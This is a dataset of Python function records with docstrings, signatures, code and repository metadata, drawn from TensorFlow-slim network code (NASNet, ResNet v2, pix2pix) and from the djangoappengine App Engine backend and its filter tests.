{"docstring": "\"\"\"Matches dimension of prev_layer to the curr_layer.\"\"\"\n# Set the prev layer to the current layer if it is none\n", "func_signal": "def _reduce_prev_layer(self, prev_layer, curr_layer):\n", "code": "if prev_layer is None:\n  return curr_layer\ncurr_num_filters = self._filter_size\nprev_num_filters = get_channel_dim(prev_layer.shape)\ncurr_filter_shape = int(curr_layer.shape[2])\nprev_filter_shape = int(prev_layer.shape[2])\nif curr_filter_shape != prev_filter_shape:\n  prev_layer = tf.nn.relu(prev_layer)\n  prev_layer = factorized_reduction(\n      prev_layer, curr_num_filters, stride=2)\nelif curr_num_filters != prev_num_filters:\n  prev_layer = tf.nn.relu(prev_layer)\n  prev_layer = slim.conv2d(\n      prev_layer, curr_num_filters, 1, scope='prev_1x1')\n  prev_layer = slim.batch_norm(prev_layer, scope='prev_bn')\nreturn prev_layer", "path": "nets\\nasnet\\nasnet_utils.py", "repo_name": "cameronfabbri/Compute-Features", "stars": 312, "license": "None", "language": "python", "size": 152}
{"docstring": "\"\"\"Verify the values of dense feature extraction by atrous convolution.\n\nMake sure that dense feature extraction by stack_blocks_dense() followed by\nsubsampling gives identical results to feature extraction at the nominal\nnetwork output stride using the simple self._stack_blocks_nondense() above.\n\"\"\"\n", "func_signal": "def testAtrousValuesBottleneck(self):\n", "code": "block = resnet_v2.resnet_v2_block\nblocks = [\n    block('block1', base_depth=1, num_units=2, stride=2),\n    block('block2', base_depth=2, num_units=2, stride=2),\n    block('block3', base_depth=4, num_units=2, stride=2),\n    block('block4', base_depth=8, num_units=2, stride=1),\n]\nnominal_stride = 8\n\n# Test both odd and even input dimensions.\nheight = 30\nwidth = 31\nwith slim.arg_scope(resnet_utils.resnet_arg_scope()):\n  with slim.arg_scope([slim.batch_norm], is_training=False):\n    for output_stride in [1, 2, 4, 8, None]:\n      with tf.Graph().as_default():\n        with self.test_session() as sess:\n          tf.set_random_seed(0)\n          inputs = create_test_input(1, height, width, 3)\n          # Dense feature extraction followed by subsampling.\n          output = resnet_utils.stack_blocks_dense(inputs,\n                                                   blocks,\n                                                   output_stride)\n          if output_stride is None:\n            factor = 1\n          else:\n            factor = nominal_stride // output_stride\n\n          output = resnet_utils.subsample(output, factor)\n          # Make the two networks use the same weights.\n          tf.get_variable_scope().reuse_variables()\n          # Feature extraction at the nominal network rate.\n          expected = self._stack_blocks_nondense(inputs, blocks)\n          sess.run(tf.global_variables_initializer())\n          output, expected = sess.run([output, expected])\n          self.assertAllClose(output, expected, atol=1e-4, rtol=1e-4)", "path": "nets\\resnet_v2_test.py", "repo_name": "cameronfabbri/Compute-Features", "stars": 312, "license": "None", "language": "python", "size": 152}
{"docstring": "\"\"\"Runs the beginning of the conv cell before the predicted ops are run.\"\"\"\n", "func_signal": "def _cell_base(self, net, prev_layer):\n", "code": "num_filters = self._filter_size\n\n# Check to be sure prev layer stuff is setup correctly\nprev_layer = self._reduce_prev_layer(prev_layer, net)\n\nnet = tf.nn.relu(net)\nnet = slim.conv2d(net, num_filters, 1, scope='1x1')\nnet = slim.batch_norm(net, scope='beginning_bn')\nsplit_axis = get_channel_index()\nnet = tf.split(\n    axis=split_axis, num_or_size_splits=1, value=net)\nfor split in net:\n  assert int(split.shape[split_axis] == int(self._num_conv_filters *\n                                            self._filter_scaling))\nnet.append(prev_layer)\nreturn net", "path": "nets\\nasnet\\nasnet_utils.py", "repo_name": "cameronfabbri/Compute-Features", "stars": 312, "license": "None", "language": "python", "size": 152}
{"docstring": "\"\"\"Helper function for creating a resnet_v2 bottleneck block.\n\nArgs:\n  scope: The scope of the block.\n  base_depth: The depth of the bottleneck layer for each unit.\n  num_units: The number of units in the block.\n  stride: The stride of the block, implemented as a stride in the last unit.\n    All other units have stride=1.\n\nReturns:\n  A resnet_v2 bottleneck block.\n\"\"\"\n", "func_signal": "def resnet_v2_block(scope, base_depth, num_units, stride):\n", "code": "return resnet_utils.Block(scope, bottleneck, [{\n    'depth': base_depth * 4,\n    'depth_bottleneck': base_depth,\n    'stride': 1\n}] * (num_units - 1) + [{\n    'depth': base_depth * 4,\n    'depth_bottleneck': base_depth,\n    'stride': stride\n}])", "path": "nets\\resnet_v2.py", "repo_name": "cameronfabbri/Compute-Features", "stars": 312, "license": "None", "language": "python", "size": 152}
{"docstring": "\"\"\"A simplified ResNet Block stacker without output stride control.\"\"\"\n", "func_signal": "def _stack_blocks_nondense(self, net, blocks):\n", "code": "for block in blocks:\n  with tf.variable_scope(block.scope, 'block', [net]):\n    for i, unit in enumerate(block.args):\n      with tf.variable_scope('unit_%d' % (i + 1), values=[net]):\n        net = block.unit_fn(net, rate=1, **unit)\nreturn net", "path": "nets\\resnet_v2_test.py", "repo_name": "cameronfabbri/Compute-Features", "stars": 312, "license": "None", "language": "python", "size": 152}
{"docstring": "\"\"\"Reduces the shape of net without information loss due to striding.\"\"\"\n", "func_signal": "def factorized_reduction(net, output_filters, stride, data_format=INVALID):\n", "code": "assert output_filters % 2 == 0, (\n    'Need even number of filters when using this factorized reduction.')\nassert data_format != INVALID\nif stride == 1:\n  net = slim.conv2d(net, output_filters, 1, scope='path_conv')\n  net = slim.batch_norm(net, scope='path_bn')\n  return net\nif data_format == 'NHWC':\n  stride_spec = [1, stride, stride, 1]\nelse:\n  stride_spec = [1, 1, stride, stride]\n\n# Skip path 1\npath1 = tf.nn.avg_pool(\n    net, [1, 1, 1, 1], stride_spec, 'VALID', data_format=data_format)\npath1 = slim.conv2d(path1, int(output_filters / 2), 1, scope='path1_conv')\n\n# Skip path 2\n# First pad with 0's on the right and bottom, then shift the filter to\n# include those 0's that were added.\nif data_format == 'NHWC':\n  pad_arr = [[0, 0], [0, 1], [0, 1], [0, 0]]\n  path2 = tf.pad(net, pad_arr)[:, 1:, 1:, :]\n  concat_axis = 3\nelse:\n  pad_arr = [[0, 0], [0, 0], [0, 1], [0, 1]]\n  path2 = tf.pad(net, pad_arr)[:, :, 1:, 1:]\n  concat_axis = 1\n\npath2 = tf.nn.avg_pool(\n    path2, [1, 1, 1, 1], stride_spec, 'VALID', data_format=data_format)\npath2 = slim.conv2d(path2, int(output_filters / 2), 1, scope='path2_conv')\n\n# Concat and apply BN\nfinal_path = tf.concat(values=[path1, path2], axis=concat_axis)\nfinal_path = slim.batch_norm(final_path, scope='final_path_bn')\nreturn final_path", "path": "nets\\nasnet\\nasnet_utils.py", "repo_name": "cameronfabbri/Compute-Features", "stars": 312, "license": "None", "language": "python", "size": 152}
{"docstring": "\"\"\"Verify dense feature extraction with atrous convolution.\"\"\"\n", "func_signal": "def testAtrousFullyConvolutionalValues(self):\n", "code": "nominal_stride = 32\nfor output_stride in [4, 8, 16, 32, None]:\n  with slim.arg_scope(resnet_utils.resnet_arg_scope()):\n    with tf.Graph().as_default():\n      with self.test_session() as sess:\n        tf.set_random_seed(0)\n        inputs = create_test_input(2, 81, 81, 3)\n        # Dense feature extraction followed by subsampling.\n        output, _ = self._resnet_small(inputs, None,\n                                       is_training=False,\n                                       global_pool=False,\n                                       output_stride=output_stride)\n        if output_stride is None:\n          factor = 1\n        else:\n          factor = nominal_stride // output_stride\n        output = resnet_utils.subsample(output, factor)\n        # Make the two networks use the same weights.\n        tf.get_variable_scope().reuse_variables()\n        # Feature extraction at the nominal network rate.\n        expected, _ = self._resnet_small(inputs, None,\n                                         is_training=False,\n                                         global_pool=False)\n        sess.run(tf.global_variables_initializer())\n        self.assertAllClose(output.eval(), expected.eval(),\n                            atol=1e-4, rtol=1e-4)", "path": "nets\\resnet_v2_test.py", "repo_name": "cameronfabbri/Compute-Features", "stars": 312, "license": "None", "language": "python", "size": 152}
{"docstring": "\"\"\"Drops out a whole example hiddenstate with the specified probability.\"\"\"\n", "func_signal": "def drop_path(net, keep_prob, is_training=True):\n", "code": "if is_training:\n  batch_size = tf.shape(net)[0]\n  noise_shape = [batch_size, 1, 1, 1]\n  random_tensor = keep_prob\n  random_tensor += tf.random_uniform(noise_shape, dtype=tf.float32)\n  binary_tensor = tf.floor(random_tensor)\n  net = tf.div(net, keep_prob) * binary_tensor\nreturn net", "path": "nets\\nasnet\\nasnet_utils.py", "repo_name": "cameronfabbri/Compute-Features", "stars": 312, "license": "None", "language": "python", "size": 152}
{"docstring": "\"\"\"Returns the default blocks, scaled down to make test run faster.\"\"\"\n", "func_signal": "def _reduced_default_blocks(self):\n", "code": "return [pix2pix.Block(b.num_filters // 32, b.decoder_keep_prob)\n        for b in pix2pix._default_generator_blocks()]", "path": "nets\\pix2pix_test.py", "repo_name": "cameronfabbri/Compute-Features", "stars": 312, "license": "None", "language": "python", "size": 152}
{"docstring": "\"\"\"Subsamples the input along the spatial dimensions.\n\nArgs:\n  inputs: A `Tensor` of size [batch, height_in, width_in, channels].\n  factor: The subsampling factor.\n  scope: Optional variable_scope.\n\nReturns:\n  output: A `Tensor` of size [batch, height_out, width_out, channels] with the\n    input, either intact (if factor == 1) or subsampled (if factor > 1).\n\"\"\"\n", "func_signal": "def subsample(inputs, factor, scope=None):\n", "code": "if factor == 1:\n  return inputs\nelse:\n  return slim.max_pool2d(inputs, [1, 1], stride=factor, scope=scope)", "path": "nets\\resnet_utils.py", "repo_name": "cameronfabbri/Compute-Features", "stars": 312, "license": "None", "language": "python", "size": 152}
{"docstring": "\"\"\"Test the end points of a tiny v2 bottleneck network.\"\"\"\n", "func_signal": "def testEndPointsV2(self):\n", "code": "blocks = [\n    resnet_v2.resnet_v2_block(\n        'block1', base_depth=1, num_units=2, stride=2),\n    resnet_v2.resnet_v2_block(\n        'block2', base_depth=2, num_units=2, stride=1),\n]\ninputs = create_test_input(2, 32, 16, 3)\nwith slim.arg_scope(resnet_utils.resnet_arg_scope()):\n  _, end_points = self._resnet_plain(inputs, blocks, scope='tiny')\nexpected = [\n    'tiny/block1/unit_1/bottleneck_v2/shortcut',\n    'tiny/block1/unit_1/bottleneck_v2/conv1',\n    'tiny/block1/unit_1/bottleneck_v2/conv2',\n    'tiny/block1/unit_1/bottleneck_v2/conv3',\n    'tiny/block1/unit_2/bottleneck_v2/conv1',\n    'tiny/block1/unit_2/bottleneck_v2/conv2',\n    'tiny/block1/unit_2/bottleneck_v2/conv3',\n    'tiny/block2/unit_1/bottleneck_v2/shortcut',\n    'tiny/block2/unit_1/bottleneck_v2/conv1',\n    'tiny/block2/unit_1/bottleneck_v2/conv2',\n    'tiny/block2/unit_1/bottleneck_v2/conv3',\n    'tiny/block2/unit_2/bottleneck_v2/conv1',\n    'tiny/block2/unit_2/bottleneck_v2/conv2',\n    'tiny/block2/unit_2/bottleneck_v2/conv3']\nself.assertItemsEqual(expected, end_points)", "path": "nets\\resnet_v2_test.py", "repo_name": "cameronfabbri/Compute-Features", "stars": 312, "license": "None", "language": "python", "size": 152}
{"docstring": "\"\"\"Create test input tensor.\n\nArgs:\n  batch_size: The number of images per batch or `None` if unknown.\n  height: The height of each image or `None` if unknown.\n  width: The width of each image or `None` if unknown.\n  channels: The number of channels per image or `None` if unknown.\n\nReturns:\n  Either a placeholder `Tensor` of dimension\n    [batch_size, height, width, channels] if any of the inputs are `None` or a\n  constant `Tensor` with the mesh grid values along the spatial dimensions.\n\"\"\"\n", "func_signal": "def create_test_input(batch_size, height, width, channels):\n", "code": "if None in [batch_size, height, width, channels]:\n  return tf.placeholder(tf.float32, (batch_size, height, width, channels))\nelse:\n  return tf.to_float(\n      np.tile(\n          np.reshape(\n              np.reshape(np.arange(height), [height, 1]) +\n              np.reshape(np.arange(width), [1, width]),\n              [1, height, width, 1]),\n          [batch_size, 1, 1, channels]))", "path": "nets\\resnet_v2_test.py", "repo_name": "cameronfabbri/Compute-Features", "stars": 312, "license": "None", "language": "python", "size": 152}
{"docstring": "# Like ResnetUtilsTest.testEndPointsV2(), but for the public API.\n", "func_signal": "def testEndpointNames(self):\n", "code": "global_pool = True\nnum_classes = 10\ninputs = create_test_input(2, 224, 224, 3)\nwith slim.arg_scope(resnet_utils.resnet_arg_scope()):\n  _, end_points = self._resnet_small(inputs, num_classes,\n                                     global_pool=global_pool,\n                                     scope='resnet')\nexpected = ['resnet/conv1']\nfor block in range(1, 5):\n  for unit in range(1, 4 if block < 4 else 3):\n    for conv in range(1, 4):\n      expected.append('resnet/block%d/unit_%d/bottleneck_v2/conv%d' %\n                      (block, unit, conv))\n    expected.append('resnet/block%d/unit_%d/bottleneck_v2' % (block, unit))\n  expected.append('resnet/block%d/unit_1/bottleneck_v2/shortcut' % block)\n  expected.append('resnet/block%d' % block)\nexpected.extend(['global_pool', 'resnet/logits', 'resnet/spatial_squeeze',\n                 'predictions'])\nself.assertItemsEqual(end_points.keys(), expected)", "path": "nets\\resnet_v2_test.py", "repo_name": "cameronfabbri/Compute-Features", "stars": 312, "license": "None", "language": "python", "size": 152}
{"docstring": "\"\"\"Takes in the operation string and returns the pooling type.\"\"\"\n", "func_signal": "def _operation_to_pooling_type(operation):\n", "code": "splitted_operation = operation.split('_')\nreturn splitted_operation[0]", "path": "nets\\nasnet\\nasnet_utils.py", "repo_name": "cameronfabbri/Compute-Features", "stars": 312, "license": "None", "language": "python", "size": 152}
{"docstring": "\"\"\"Apply drop_path regularization to net.\"\"\"\n", "func_signal": "def _apply_drop_path(self, net):\n", "code": "drop_path_keep_prob = self._drop_path_keep_prob\nif drop_path_keep_prob < 1.0:\n  # Scale keep prob by layer number\n  assert self._cell_num != -1\n  # The added 2 is for the reduction cells\n  num_cells = self._total_num_cells\n  layer_ratio = (self._cell_num + 1)/float(num_cells)\n  with tf.device('/cpu:0'):\n    tf.summary.scalar('layer_ratio', layer_ratio)\n  drop_path_keep_prob = 1 - layer_ratio * (1 - drop_path_keep_prob)\n  # Decrease the keep probability over time\n  current_step = tf.cast(tf.train.get_or_create_global_step(),\n                         tf.float32)\n  drop_path_burn_in_steps = self._total_training_steps\n  current_ratio = (\n      current_step / drop_path_burn_in_steps)\n  current_ratio = tf.minimum(1.0, current_ratio)\n  with tf.device('/cpu:0'):\n    tf.summary.scalar('current_ratio', current_ratio)\n  drop_path_keep_prob = (\n      1 - current_ratio * (1 - drop_path_keep_prob))\n  with tf.device('/cpu:0'):\n    tf.summary.scalar('drop_path_keep_prob', drop_path_keep_prob)\n  net = drop_path(net, drop_path_keep_prob)\nreturn net", "path": "nets\\nasnet\\nasnet_utils.py", "repo_name": "cameronfabbri/Compute-Features", "stars": 312, "license": "None", "language": "python", "size": 152}
{"docstring": "\"\"\"Strided 2-D convolution with 'SAME' padding.\n\nWhen stride > 1, then we do explicit zero-padding, followed by conv2d with\n'VALID' padding.\n\nNote that\n\n   net = conv2d_same(inputs, num_outputs, 3, stride=stride)\n\nis equivalent to\n\n   net = slim.conv2d(inputs, num_outputs, 3, stride=1, padding='SAME')\n   net = subsample(net, factor=stride)\n\nwhereas\n\n   net = slim.conv2d(inputs, num_outputs, 3, stride=stride, padding='SAME')\n\nis different when the input's height or width is even, which is why we add the\ncurrent function. For more details, see ResnetUtilsTest.testConv2DSameEven().\n\nArgs:\n  inputs: A 4-D tensor of size [batch, height_in, width_in, channels].\n  num_outputs: An integer, the number of output filters.\n  kernel_size: An int with the kernel_size of the filters.\n  stride: An integer, the output stride.\n  rate: An integer, rate for atrous convolution.\n  scope: Scope.\n\nReturns:\n  output: A 4-D tensor of size [batch, height_out, width_out, channels] with\n    the convolution output.\n\"\"\"\n", "func_signal": "def conv2d_same(inputs, num_outputs, kernel_size, stride, rate=1, scope=None):\n", "code": "if stride == 1:\n  return slim.conv2d(inputs, num_outputs, kernel_size, stride=1, rate=rate,\n                     padding='SAME', scope=scope)\nelse:\n  kernel_size_effective = kernel_size + (kernel_size - 1) * (rate - 1)\n  pad_total = kernel_size_effective - 1\n  pad_beg = pad_total // 2\n  pad_end = pad_total - pad_beg\n  inputs = tf.pad(inputs,\n                  [[0, 0], [pad_beg, pad_end], [pad_beg, pad_end], [0, 0]])\n  return slim.conv2d(inputs, num_outputs, kernel_size, stride=stride,\n                     rate=rate, padding='VALID', scope=scope)", "path": "nets\\resnet_utils.py", "repo_name": "cameronfabbri/Compute-Features", "stars": 312, "license": "None", "language": "python", "size": 152}
{"docstring": "\"\"\"Takes in operation name and returns meta information.\n\nAn example would be 'separable_3x3_4' -> (3, 4).\n\nArgs:\n  operation: String that corresponds to convolution operation.\n\nReturns:\n  Tuple of (filter shape, num layers).\n\"\"\"\n", "func_signal": "def _operation_to_info(operation):\n", "code": "num_layers = _operation_to_num_layers(operation)\nfilter_shape = _operation_to_filter_shape(operation)\nreturn num_layers, filter_shape", "path": "nets\\nasnet\\nasnet_utils.py", "repo_name": "cameronfabbri/Compute-Features", "stars": 312, "license": "None", "language": "python", "size": 152}
{"docstring": "\"\"\"\nStarts the App Engine dev_appserver program for the Django\nproject. The appserver is run with default parameters. If you\nneed to pass any special parameters to the dev_appserver you\nwill have to invoke it manually.\n\nUnlike the normal devserver, does not use the autoreloader as\nApp Engine dev_appserver needs to be run from the main thread\n\"\"\"\n\n", "func_signal": "def run(self, *args, **options):\n", "code": "args = []\n# Set bind ip/port if specified.\nif self.addr:\n    if settings.DEV_APPSERVER_VERSION == 1:\n        args.extend(['--address', self.addr])\n    else:\n        args.extend(['--host', self.addr])\nif self.port:\n    if settings.DEV_APPSERVER_VERSION == 1:\n        args.extend(['--port', self.port])\n    else:\n        args.extend(['--port', self.port if self.port != DEFAULT_PORT else DEV_APPSERVER_V2_DEFAULT_PORT])\n\n# If runserver is called using handle(), progname will not be\n# set.\nif not hasattr(self, 'progname'):\n    self.progname = 'manage.py'\n\n# Add email settings.\nif not options.get('smtp_host', None) and \\\n   not options.get('enable_sendmail', None):\n    args.extend(['--smtp_host', settings.EMAIL_HOST,\n                 '--smtp_port', str(settings.EMAIL_PORT),\n                 '--smtp_user', settings.EMAIL_HOST_USER,\n                 '--smtp_password', settings.EMAIL_HOST_PASSWORD])\n\n# Pass the application specific datastore location to the\n# server.\npreset_options = {}\nfor name in connections:\n    connection = connections[name]\n    if isinstance(connection, DatabaseWrapper):\n        for key, path in get_datastore_paths(connection.settings_dict).items():\n            arg = '--' + key\n            if arg not in args:\n                args.extend([arg, path])\n        # Get dev_appserver option presets, to be applied below.\n        preset_options = connection.settings_dict.get('DEV_APPSERVER_OPTIONS', {})\n        break\n\n# Process the rest of the options here.\nif settings.DEV_APPSERVER_VERSION == 1:\n    bool_options = [\n        'debug', 'debug_imports', 'clear_datastore', 'require_indexes',\n        'high_replication', 'enable_sendmail', 'use_sqlite',\n        'allow_skipped_files', 'disable_task_running']\nelse:\n    bool_options = [\n        'debug', 'debug_imports', 'clear_datastore', 'require_indexes',\n        'enable_sendmail', 'allow_skipped_files', 'disable_task_running']\nfor opt in bool_options:\n    if options[opt] != False:\n        if settings.DEV_APPSERVER_VERSION == 1:\n            args.append('--%s' % opt)\n        else:\n            args.extend(['--%s' % opt, 'yes'])\n\nstr_options = [\n    'datastore_path', 'blobstore_path', 'history_path', 'login_url', 'smtp_host',\n    'smtp_port', 'smtp_user', 'smtp_password', 'auto_id_policy']\nfor opt in str_options:\n    if options.get(opt, None) != None:\n        args.extend(['--%s' % opt, options[opt]])\n\n# Fill any non-overridden options with presets from settings.\nfor opt, value in preset_options.items():\n    arg = '--%s' % opt\n    if arg not in args:\n        if value and opt in bool_options:\n            if settings.DEV_APPSERVER_VERSION == 1:\n                args.append(arg)\n            else:\n                args.extend([arg, value])\n        elif opt in str_options:\n            args.extend([arg, value])\n        # TODO: Issue warning about bogus option key(s)?\n\n# Reset logging level to INFO as dev_appserver will spew tons\n# of debug logs.\nlogging.getLogger().setLevel(logging.INFO)\n\n# Append the current working directory to the arguments.\nif settings.DEV_APPSERVER_VERSION == 1:\n    dev_appserver_main.main([self.progname] + args + [PROJECT_DIR])\nelse:\n    from google.appengine.api import apiproxy_stub_map\n\n    # Environment is set in djangoappengine.stubs.setup_local_stubs()\n    # We need to do this effectively reset the stubs.\n    apiproxy_stub_map.apiproxy = apiproxy_stub_map.GetDefaultAPIProxy()\n\n    sys.argv = ['/home/user/google_appengine/devappserver2.py'] + args + [PROJECT_DIR]\n    devappserver2.main()", "path": "djangoappengine\\management\\commands\\runserver.py", "repo_name": "django-nonrel/djangoappengine", "stars": 268, "license": "bsd-3-clause", "language": "python", "size": 1262}
{"docstring": "# Test equality filter on primary_key field.\n", "func_signal": "def test_equals(self):\n", "code": "self.assertEquals(\n    [entity.email for entity in FieldsWithOptionsModel.objects\n        .filter(email='rinnengan@sage.de').order_by('email')],\n    ['rinnengan@sage.de'])", "path": "djangoappengine\\tests\\test_filter.py", "repo_name": "django-nonrel/djangoappengine", "stars": 268, "license": "bsd-3-clause", "language": "python", "size": 1262}
{"docstring": "# Test slicing on filter with primary_key.\n", "func_signal": "def test_slicing(self):\n", "code": "self.assertEquals(\n    [entity.email for entity in FieldsWithOptionsModel.objects\n        .filter(email__lte='rinnengan@sage.de')\n        .order_by('email')[:2]],\n    ['app-engine@scholardocs.com', 'rasengan@naruto.com', ])\n\nself.assertEquals(\n    [entity.email for entity in FieldsWithOptionsModel.objects\n        .filter(email__lte='rinnengan@sage.de')\n        .order_by('email')[1:2]],\n    ['rasengan@naruto.com', ])\n\n# Test on non pk field.\nself.assertEquals(\n    [entity.integer for entity in FieldsWithOptionsModel.objects\n        .all().order_by('integer')[:2]],\n    [1, 2, ])\n\nself.assertEquals(\n    [entity.email for entity in FieldsWithOptionsModel.objects\n        .all().order_by('email')[::2]],\n    ['app-engine@scholardocs.com', 'rinnengan@sage.de'])", "path": "djangoappengine\\tests\\test_filter.py", "repo_name": "django-nonrel/djangoappengine", "stars": 268, "license": "bsd-3-clause", "language": "python", "size": 1262}
{"docstring": "# Test year on date range boundaries.\n", "func_signal": "def test_date(self):\n", "code": "self.assertEquals(\n    [entity.datetime for entity in DateTimeModel.objects\n        .filter(datetime__year=2010).order_by('datetime')],\n    [datetime.datetime(2010, 1, 1, 0, 0, 0, 0),\n     datetime.datetime(2010, 12, 31, 23, 59, 59, 999999)])\n\n# Test year on non boundary date.\nself.assertEquals(\n    [entity.datetime for entity in DateTimeModel.objects\n        .filter(datetime__year=2013).order_by('datetime')],\n    [datetime.datetime(2013, 7, 28, 22, 30, 20, 50)])", "path": "djangoappengine\\tests\\test_filter.py", "repo_name": "django-nonrel/djangoappengine", "stars": 268, "license": "bsd-3-clause", "language": "python", "size": 1262}
{"docstring": "\"\"\"\nUndoes conversions done in value_for_db.\n\"\"\"\n\n# We could have stored None for a null field.\n", "func_signal": "def _value_from_db(self, value, field, field_kind, db_type):\n", "code": "if value is None:\n    return None\n\n# All keys were converted to the Key class.\nif db_type == 'key':\n    assert isinstance(value, Key), \\\n        \"GAE db.Key expected! Try changing to old storage, \" \\\n        \"dumping data, changing to new storage and reloading.\"\n    assert value.parent() is None, \"Parents are not yet supported!\"\n    value = value.id_or_name()", "path": "djangoappengine\\db\\base.py", "repo_name": "django-nonrel/djangoappengine", "stars": 268, "license": "bsd-3-clause", "language": "python", "size": 1262}
{"docstring": "# Test lte on float.\n", "func_signal": "def test_lte(self):\n", "code": "self.assertEquals(\n    [entity.floating_point\n     for entity in FieldsWithOptionsModel.objects\n        .filter(floating_point__lte=5.3).order_by('floating_point')],\n    [1.58, 2.6, 5.3])\n\n# Test lte on integer.\nself.assertEquals(\n    [entity.integer for entity in FieldsWithOptionsModel.objects\n        .filter(integer__lte=5).order_by('integer')],\n    [1, 2, 5])\n\n# Test filter on primary_key field.\nself.assertEquals(\n    [entity.email for entity in FieldsWithOptionsModel.objects\n        .filter(email__lte='rinnengan@sage.de').order_by('email')],\n    ['app-engine@scholardocs.com', 'rasengan@naruto.com',\n     'rinnengan@sage.de'])", "path": "djangoappengine\\tests\\test_filter.py", "repo_name": "django-nonrel/djangoappengine", "stars": 268, "license": "bsd-3-clause", "language": "python", "size": 1262}
{"docstring": "\"\"\"\nWe'll simulate `startswith` lookups with two inequalities:\n\n    property >= value and property <= value + u'\\ufffd',\n\nand need to \"double\" the value before passing it through the\nactual datastore conversions.\n\"\"\"\n", "func_signal": "def value_for_db(self, value, field, lookup=None):\n", "code": "super_value_for_db = super(DatabaseOperations, self).value_for_db\nif lookup == 'startswith':\n    return [super_value_for_db(value, field, lookup),\n            super_value_for_db(value + u'\\ufffd', field, lookup)]\nreturn super_value_for_db(value, field, lookup)", "path": "djangoappengine\\db\\base.py", "repo_name": "django-nonrel/djangoappengine", "stars": 268, "license": "bsd-3-clause", "language": "python", "size": 1262}
{"docstring": "# Test gt on float.\n", "func_signal": "def test_gt(self):\n", "code": "self.assertEquals(\n    [entity.floating_point\n     for entity in FieldsWithOptionsModel.objects\n        .filter(floating_point__gt=3.1).order_by('floating_point')],\n    [5.3, 9.1])\n\n# Test gt on integer.\nself.assertEquals(\n    [entity.integer for entity in FieldsWithOptionsModel.objects\n        .filter(integer__gt=3).order_by('integer')],\n    [5, 9])\n\n# Test filter on primary_key field.\nself.assertEquals(\n    [entity.email for entity in FieldsWithOptionsModel.objects\n        .filter(email__gt='as').order_by('email')],\n    ['rasengan@naruto.com', 'rinnengan@sage.de',\n     'sharingan@uchias.com', ])\n\n# Test ForeignKeys with id.\nself.assertEquals(\n    sorted([entity.email for entity in FieldsWithOptionsModel.objects\n        .filter(foreign_key__gt=2)]),\n    ['rasengan@naruto.com', 'rinnengan@sage.de'])\n\n# And with instance.\nordered_instance = OrderedModel.objects.get(priority=1)\nself.assertEquals(\n    sorted([entity.email for entity in FieldsWithOptionsModel.objects\n        .filter(foreign_key__gt=ordered_instance)]),\n    ['rasengan@naruto.com', 'rinnengan@sage.de'])", "path": "djangoappengine\\tests\\test_filter.py", "repo_name": "django-nonrel/djangoappengine", "stars": 268, "license": "bsd-3-clause", "language": "python", "size": 1262}
{"docstring": "# Test gte on float.\n", "func_signal": "def test_gte(self):\n", "code": "self.assertEquals(\n    [entity.floating_point\n     for entity in FieldsWithOptionsModel.objects\n        .filter(floating_point__gte=2.6).order_by('floating_point')],\n    [2.6, 5.3, 9.1])\n\n# Test gte on integer.\nself.assertEquals(\n    [entity.integer for entity in FieldsWithOptionsModel.objects\n        .filter(integer__gte=2).order_by('integer')],\n    [2, 5, 9])\n\n# Test filter on primary_key field.\nself.assertEquals(\n    [entity.email for entity in FieldsWithOptionsModel.objects\n        .filter(email__gte='rinnengan@sage.de').order_by('email')],\n    ['rinnengan@sage.de', 'sharingan@uchias.com', ])", "path": "djangoappengine\\tests\\test_filter.py", "repo_name": "django-nonrel/djangoappengine", "stars": 268, "license": "bsd-3-clause", "language": "python", "size": 1262}
{"docstring": "\"\"\"\nWorkaround for GAE choosing not to validate integer ids when\ncreating keys.\n\nTODO: Should be removed if it gets fixed.\n\"\"\"\n", "func_signal": "def key_from_path(db_table, value):\n", "code": "if isinstance(value, (int, long)):\n    ValidateInteger(value, 'id')\nreturn Key.from_path(db_table, value)", "path": "djangoappengine\\db\\base.py", "repo_name": "django-nonrel/djangoappengine", "stars": 268, "license": "bsd-3-clause", "language": "python", "size": 1262}
{"docstring": "\"\"\"\nCreates and returns the ``OptionParser`` which will be used to\nparse the arguments to this command.\n\"\"\"\n# Hack __main__ so --help in dev_appserver_main works OK.\n", "func_signal": "def create_parser(self, prog_name, subcommand):\n", "code": "if settings.DEV_APPSERVER_VERSION == 1:\n    sys.modules['__main__'] = dev_appserver_main\nelse:\n    sys.modules['__main__'] = devappserver2\nreturn super(Command, self).create_parser(prog_name, subcommand)", "path": "djangoappengine\\management\\commands\\runserver.py", "repo_name": "django-nonrel/djangoappengine", "stars": 268, "license": "bsd-3-clause", "language": "python", "size": 1262}
{"docstring": "# Test values().\n", "func_signal": "def test_values(self):\n", "code": "self.assertEquals(\n    [entity['pk'] for entity in FieldsWithOptionsModel.objects\n        .filter(integer__gt=3).order_by('integer').values('pk')],\n    ['app-engine@scholardocs.com', 'rinnengan@sage.de'])\n\nself.assertEquals(FieldsWithOptionsModel.objects\n    .filter(integer__gt=3).order_by('integer').values('pk').count(), 2)\n\n# These queries first fetch the whole entity and then only\n# return the desired fields selected in .values.\nself.assertEquals(\n    [entity['integer'] for entity in FieldsWithOptionsModel.objects\n        .filter(email__startswith='r')\n        .order_by('email').values('integer')],\n    [1, 9])\n\nself.assertEquals(\n    [entity['floating_point']\n     for entity in FieldsWithOptionsModel.objects\n        .filter(integer__gt=3)\n        .order_by('integer').values('floating_point')],\n    [5.3, 9.1])\n\n# Test values_list.\nself.assertEquals(\n    [entity[0] for entity in FieldsWithOptionsModel.objects\n        .filter(integer__gt=3).order_by('integer').values_list('pk')],\n    ['app-engine@scholardocs.com', 'rinnengan@sage.de'])", "path": "djangoappengine\\tests\\test_filter.py", "repo_name": "django-nonrel/djangoappengine", "stars": 268, "license": "bsd-3-clause", "language": "python", "size": 1262}
{"docstring": "# Test pk__in with field name email.\n", "func_signal": "def test_pk_in(self):\n", "code": "self.assertEquals(\n    [entity.email for entity in FieldsWithOptionsModel.objects\n        .filter(email__in=['app-engine@scholardocs.com',\n                           'rasengan@naruto.com'])],\n    ['app-engine@scholardocs.com', 'rasengan@naruto.com'])", "path": "djangoappengine\\tests\\test_filter.py", "repo_name": "django-nonrel/djangoappengine", "stars": 268, "license": "bsd-3-clause", "language": "python", "size": 1262}
